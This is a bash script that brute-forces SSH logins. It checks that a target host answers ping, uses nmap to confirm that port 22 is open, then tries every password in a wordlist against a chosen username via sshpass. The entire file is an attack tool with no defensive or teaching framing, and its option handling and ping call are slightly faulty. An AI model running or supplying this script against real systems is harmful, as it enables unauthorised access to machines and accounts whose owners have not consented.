#!/bin/bash

LINE=0
WORDLIST="Desktop/pass.txt"
IP="192.168.100.17"
USERNAME="kali"

while getopts i:u:p flag
do
    case "${flag}" in
        i) IP=${OPTARG};;
        u) USERNAME=${OPTARG};;
        p) WORDLIST=${OPTARG};;
    esac
done

if [[ $IP == "" ]]; then

    echo "[-] Must have a IP"

    exit 0

fi

PING_IP=$(ping -t 5 $IP)

if [[ "$PING_IP" == *"ms"* ]]; then

		echo  "[+] Host is up"
		
else

        echo "[-] Host is down"
		
		exit 0
fi

PORT_SCAN=$(nmap $IP -p 22)

if [[ $PORT_SCAN == *"open"* ]]; then
		
    echo "[+] port 22 is open"
    
else

    echo "[-] port 22 is closed"

    exit 0
    
fi

LINES=$(wc -l < $WORDLIST)

while [ $LINE != $LINES ]; do

    LINE=$((1 + $LINE))

    #PASSWORD="sed -n ${LINE}p $WORDLIST"

    PASSWORD=$(sed -n ${LINE}p $WORDLIST)

    echo "[*] Attempting: $USERNAME : $PASSWORD : $IP"

    sshpass -p $PASSWORD ssh $USERNAME@$IP

done
